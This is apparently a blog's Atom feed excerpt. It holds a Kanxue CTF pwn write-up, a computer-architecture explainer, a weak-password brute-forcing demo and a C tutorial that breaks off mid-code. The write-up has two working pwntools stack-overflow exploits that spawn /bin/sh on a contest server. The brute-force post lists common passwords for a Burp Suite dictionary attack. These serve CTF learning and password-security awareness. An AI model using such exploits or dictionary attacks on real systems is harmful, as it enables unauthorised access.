7af1715c2f070b192285e7dd9c043cd80044ba6adc0c9fccc12429bd7afaf8d32dbd17b116bea2611c56765f11094c03106ff1e147b6217ea4284b412633485d1d21cda5c4f800f3cc6a43c9ac0066dae259620aed33bb2530b8c4e8ae926475d57205c60edb63210d544eb89510e4380dc932d64e12becf1102c95913003c2e75cb0578e34074bd3e7835fdb33153dc52b4883de7a786763f14203abbe197658a755e2edea8842780b21a3ce7121d23b25170b9bd25b8a676bbf1bc1cbcfe76cc586842586e98b964cdee80ffea1b442c6945673b809ed95f55c8c1d844fa6a34f2396234956f60a9be01ceec7799955134640802d1a8790b11b22fe745f08022a0a1bd765d1d38b75ee02ccb370c321ec9271771c77c22e2c4d7140886858e26314f54eaf301c83b7b04dc3f92af6b5a05351db37b68a0587b1e9ba08a31190090d16c5a4f496542dd69838324f199bad09fec94ac57d5d9669f12efcf9852fa442301091af8bb7f303d7ef3e749075d8ff0ad419d4a00a3fb2bd0d2f1c9482f669a86a066cf27379958ab6b45cd6eac00c616d3e9f72975f1fdbd57244788b144d7a7547fe13fa56aed1559e8136f959f0aedc99a046789d6cb01a183814cb71f7e17663a916017d866b26f588fab4f00ab864d67f0390d5d6a87d57b6d041a4ec78380992f43946502e49d02d5a8f9edc11526271b2029dbfc146d9b67aa2864c624a557323717c301363064a462a24ebfb03ec8eebccd7641bdcc803ef8299f6fd0a606b19799de59515bfe2c50a021370bfa1cf5885306b8303b4bc564f4cc21d82af7f762b24a59cc32dfb42680d9cf93157d6c0aeebaf4afbe2d72aebc135bf35afea40b9c4e4aec1a1a958a74fe99e528acdee887b4ed65ba75e8d6c9b2662789202f4576c3d4658db705a0219d9e3c78801929ce8eaf2045c821c6fd912f7aafe7a9016f0f9a56609ddc940f16f4542bb8888da8f5db2d2a05350bb70d5dcb6f76d9c294388157a6470878b31e7f9c2692143beccdf920f4d9cac4f1957dff6385af5fb63fb97b31c64cdfa61e6005e8d233e47c1a56e7a87fa57b51c8118cc1f8834330c1c56bef7cfc19d102476345150c40d806525ff3f05ca6ed68133ddacaea52885f7a490f7fb1443384b1ad469f9237dcb603a9e07e738c74fdb4f40254fefb12cde3f58c2943f9388ef04355bcca2d93007a7702de6453a5b62478ea32813140ca7e426d1084dd0359046fb1b593a9eb320b148b7ec5c19f8a6ae732c43414fcbbd7099d591ad91f2477862145e1eda1f5414dbe60adc5234e58aefb67f815b25bb9a5e9bfde1daf641a29e9f6f756da23337839e81520090ccfab7590227054d73b5dca0a0d4019f83278825cbb04fd879d6586f54e7b7991e1ef97648c51461fd6def785bb900cac9e1f12f5f991d3f76e018e38e7df9baef49ec6625d56e549756589020e8a0802fc72f1666350413d0c69592337624cfbbbf05ec4d5f2febe721ff238f0018ca703de1ac8e10185e117ac0f423b6e5b8c3b012d7dc5532f11ad7233abfadb7ba941a9835818250ab18be65687dd2ed30b41032dfcab5ed039d60d3ff339d5a278f87e13cd9b44aa39fcb754e280f306c503d2c58ffc2cf4462e4a72406f6cc5fed6b6d48536cfa5a909c7fd1455249d1c58640a69ee8efe46038f9347dba3fc21fd436a7c6d92209e3d495d9fc3d615d34ca91bc2676b7679093cff2b86fc0d8711238c74532a534773c691eb6834761a179249fdf81551c10b22f4b6a86db4931002aa9227ca7818b722d8d9e8a8679d61656656bc88a5ef9b93244f32f7de4a140f1b961ee9d95c53da5a6085e679b4b7eb83b68073ceafb01ffc4327239e4d7246a640b84d8391d42a302b4c9d9ed1790ffcad19ab6202779b63ba1bb03f86b6316c29568f65e4f5b6c68d7361845e12a0df8efacff32e13afa4d753449ed6c36faa4918341a31d6ca62894da3f315f9afbe50d17015054e1a2a3845c924ee8486985e87727bb02c90544a1219ff5460500875f2e36549b7e57209fb80d4389f9d0c23096f55a98285921c3a124aeeea04a3f333df38c195c5690b07fb484c367ac23b6bea8a1e3a3667d35c155808af2136a351e21c043e949cf6dc9dd9fc51ca92c6e988387ab58a2603c2ec0c4b5fdc0d9c2984201af251cd74e7f8097dceddb9bdac1aa3afd7744d87221fb0860ac743a9e42ecdc44dcc47cef2ecca9f41e8f3f92f4a423abd18808c776f126e0f498c7afb662d5972593f505c0de45a9eac5529f9648b82de2e8e3cf2722522c8430c560fb3b67a6c9383985a5cfa6e1639e0b02e202ec78d214a0dabc9bd4b21eb9b8de63a50e577fe1eaa61f1e4ca1495d7ca7a235527251fa6f75e1b83a1e619e88845b66f3f2d47ca632569c6f911b66f8b81c4ac2447b7d36b765651f0209d7b4f5369c215ad40ab21c5b8c34fc90b95ff67174e21f82b72946a73458c7d75a25b82c1bf638022b20576ae70ba86b5812a5f24dcdc8d68d358f4e48003e912f37c0a9014e3319646bc3515b4ada08a32aff05fb21106522087f0cf7b58c6c2ded960dec280fa806c05185fc8dabd9767a28377193418c0738c62d8444bdaa06a6c610e9181eed5f9cee418f58310b59462871df9c21a52a7a7c97ddb2de28364658bd029bbf170f233d16ac45b56361b9010ef848815c0f166efe80defdcb0a86be8694a8b7d7d933b393a8c42e338d710bddf87ea925e79065abfa538c3f35a0dee39bb51178d49720a38c0fb8977f1230619ea96ed59518115d91e7bb7f06acbe6cd1e0572954e571e28133b3f0db20a5952ff2bcc35001205119b847a11af1b82fcb8185d65c7d185f5946d24321224a50f50cc0215f5f69c89e729fa943fb290bbeae40e1bcd8923ff817253149733512b6ed9f4d465f180a0bfc0f5f90d6c6aff83179b57dc860766ba63aed663e8c6370ba61f943492eb135cee76abe9d7b029418191a39cc17774910a2d3d6e412ed8c83fae94050aadf949ba5c49ae7526d99a109b65efc35dc9b3073a6188f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
  <entry>
    <title>【科普】冯·诺依曼结构与具体实现</title>
    <link href="https://muzibing.github.io/2020/07/03/2020.07.03%EF%BC%88133%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/03/2020.07.03（133）/</id>
    <published>2020-07-02T16:00:00.000Z</published>
    <updated>2020-07-03T07:24:55.662Z</updated>
    
    <content type="html"><![CDATA[<h4 id="font-color-navy1冯诺依曼计算的主要构成font"><a class="markdownIt-Anchor" href="#font-color-navy1冯诺依曼计算的主要构成font"></a> <font color="navy">1.冯·诺依曼计算的主要构成</font></h4><p>      冯·诺依曼计算机主要是由五大部分构成：</p><ol><li>运算器（CA）：Central Arithmetical</li><li>控制器（CC）：Central Contral</li><li>存储器（M）：Memory</li><li>输入设备（I）：Input</li><li>输出设备（O）：Output</li></ol><p>      除了上述五部分，还有一个<code>外部记录介质 R</code>(outside Recording medium)，示意图如下：</p><p><img src="/images/133-1.png" alt></p><blockquote><p>下面我们就来看看和具体实现是如何对应的呢？</p></blockquote><h4 id="font-color-navy2冯诺依曼结构原理与实现的对应font"><a class="markdownIt-Anchor" href="#font-color-navy2冯诺依曼结构原理与实现的对应font"></a> <font color="navy">2.冯·诺依曼结构原理与实现的对应</font></h4><p><img src="/images/133-2.png" alt></p><p>      如上图，它们一一对应关系如下：</p><blockquote><ul><li>CPU ⇢ 运算器 CA和控制器 CC</li><li>主存 ⇢ 存储器 M</li><li>键盘 ⇢ 输入设备 I</li><li>硬盘、显示器 ⇢  输出设备</li></ul></blockquote><p>      在这里要说明的是主板上的<code>北桥</code>、<code>南桥</code>和<code>BIOS</code>三个部件</p><p><code>北桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。</span><br></pre></td></tr></table></figure><p><code>南桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。</span><br></pre></td></tr></table></figure><p><code>BIOS</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？</span><br><span class="line">是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。</span><br><span class="line">CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在</span><br></pre></td></tr></table></figure><p>      目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。</p><h4 id="font-color-navy3南北桥架构的演变font"><a class="markdownIt-Anchor" href="#font-color-navy3南北桥架构的演变font"></a> <font color="navy">3.南北桥架构的演变</font></h4><p><code>演变（1）</code></p><p><img src="/images/133-3.png" alt></p><p>      上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。</p><p>      下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是<code>CPU访问主存的通道</code>，所以在南北桥上发生的第一个变化如下。</p><p><code>演变（2）</code></p><p><img src="/images/133-4.png" alt></p><p>      如上图，在南北桥上发生的第一个变化，就是<strong>北桥的主控制器被移到了CPU芯片中</strong>，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。</p><p><code>演变（3）</code></p><p><img src="/images/133-5.png" alt></p><p>     如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。</p><p><code>演变（4）</code></p><p><img src="/images/133-6.png" alt></p><p>      什么是系统芯片呢？系统芯片<code>就是将计算机或其他电子系统集成为单一芯片的集成电路</code>，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理<code>摩尔定律</code></p><h4 id="font-color-navy4摩尔定律font"><a class="markdownIt-Anchor" href="#font-color-navy4摩尔定律font"></a> <font color="navy">4.摩尔定律</font></h4><p><code>摩尔定律原型</code></p><p>      1965年，摩尔在《电子学》杂志上预测：<code>在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年</code>。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，<code>在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年</code>。</p><p><code>现在摩尔定律的描述</code></p><p>      现在摩尔定律常被描述为：<code>当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;1.冯·诺依
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【web安全】爆破用户登录弱口令</title>
    <link href="https://muzibing.github.io/2020/07/01/2020.07.01%EF%BC%88132%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/01/2020.07.01（132）/</id>
    <published>2020-06-30T16:00:00.000Z</published>
    <updated>2020-07-01T08:04:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如<code>123456789</code>、<code>88888888</code>等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下<font color="navy"><code>弱口令</code></font>为什么不安全的。</p><p><code>情景假设</code></p><blockquote><p>加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。</p></blockquote><p><img src="/images/132-1.png" alt></p><h4 id="font-color-navy1创建字典font"><a class="markdownIt-Anchor" href="#font-color-navy1创建字典font"></a> <font color="navy">1.创建字典</font></h4><p>     情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">a123456</span><br><span class="line">123456</span><br><span class="line">a123456789</span><br><span class="line">1234567890</span><br><span class="line">woaini1314</span><br><span class="line">qq123456</span><br><span class="line">abc123456</span><br><span class="line">123456a</span><br><span class="line">123456789a</span><br><span class="line">147258369</span><br><span class="line">zxcvbnm</span><br><span class="line">987654321</span><br><span class="line">12345678910</span><br><span class="line">abc123</span><br><span class="line">qq123456789</span><br><span class="line">123456789.</span><br><span class="line">7708801314520</span><br><span class="line">woaini</span><br><span class="line">5201314520</span><br><span class="line">q123456</span><br><span class="line">123456abc</span><br><span class="line">1233211234567</span><br><span class="line">123123123</span><br><span class="line">123456.</span><br><span class="line">0123456789</span><br><span class="line">asd123456</span><br><span class="line">aa123456</span><br><span class="line">135792468</span><br><span class="line">q123456789</span><br><span class="line">abcd123456</span><br><span class="line">12345678900</span><br><span class="line">woaini520</span><br><span class="line">woaini123</span><br><span class="line">zxcvbnm123</span><br><span class="line">1111111111111111</span><br><span class="line">w123456</span><br><span class="line">aini1314</span><br><span class="line">abc123456789</span><br><span class="line">111111</span><br><span class="line">woaini521</span><br><span class="line">qwertyuiop</span><br><span class="line">1314520520</span><br><span class="line">1234567891</span><br><span class="line">qwe123456</span><br><span class="line">asd123</span><br><span class="line">000000</span><br><span class="line">1472583690</span><br><span class="line">1357924680</span><br><span class="line">789456123</span><br><span class="line">123456789abc</span><br><span class="line">z123456</span><br><span class="line">1234567899</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2爆破密码font"><a class="markdownIt-Anchor" href="#font-color-navy2爆破密码font"></a> <font color="navy">2.爆破密码</font></h4><p>      在这里我们要用到一个抓包工具<code>Burp Suit</code>（666666），它长下面这个样子：</p><p><img src="/images/132-2.png" alt></p><p>      下面我用动图R的形式来展示一下爆破的整个过程：</p><p><img src="/images/132-3.gif" alt></p><blockquote><p>可以从上图中看出，管理员密码为<code>123456</code>，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如&lt;code&gt;123456789&lt;/cod
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列二】 C语言中的基本数据类型</title>
    <link href="https://muzibing.github.io/2020/06/26/2020.06.24%EF%BC%88131%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/26/2020.06.24（131）/</id>
    <published>2020-06-25T16:00:00.000Z</published>
    <updated>2020-06-26T11:00:38.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基本数据类型font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基本数据类型font"></a> <font color="navy"><code>0x00 基本数据类型</code></font></h3><p><img src="/images/131-1.png" alt></p><table><thead><tr><th style="text-align:center"><font size="2">基本类型</font></th><th style="text-align:center"><font size="2">字节</font></th><th style="text-align:center"><font size="2">范围</font></th></tr></thead><tbody><tr><td style="text-align:center"><font size="2">char</font></td><td style="text-align:center"><font size="2">1byte</font></td><td style="text-align:center"><font size="2">—</font></td></tr><tr><td style="text-align:center"><font color="navy" size="2">short</font></td><td style="text-align:center"><font size="2">2bytes</font></td><td style="text-align:center"><font size="2">0~32767(0~0x7fff)<br>-32768~-1(0x8000~0xffff)</font></td></tr><tr><td style="text-align:center"><font size="2">int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~2147483647(0~0x7fffffff)<br>-2147483648~-1(0x80000000~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~4294967295(0~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">正: 0~0x7fffffffffffffff<br>负: 0x8000000000000000~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">0~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">float</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">|3.4e-38|~|3.4e+38|</font></td></tr><tr><td style="text-align:center"><font size="2">double</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">|1.7e-308|~|1.7e+308|</font></td></tr></tbody></table><blockquote><p>下面我们用一个示例代码打印一下这些基本的数据类型，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function: 打印基本数据类型的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of char is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of short is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of long int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of float is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of double is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">    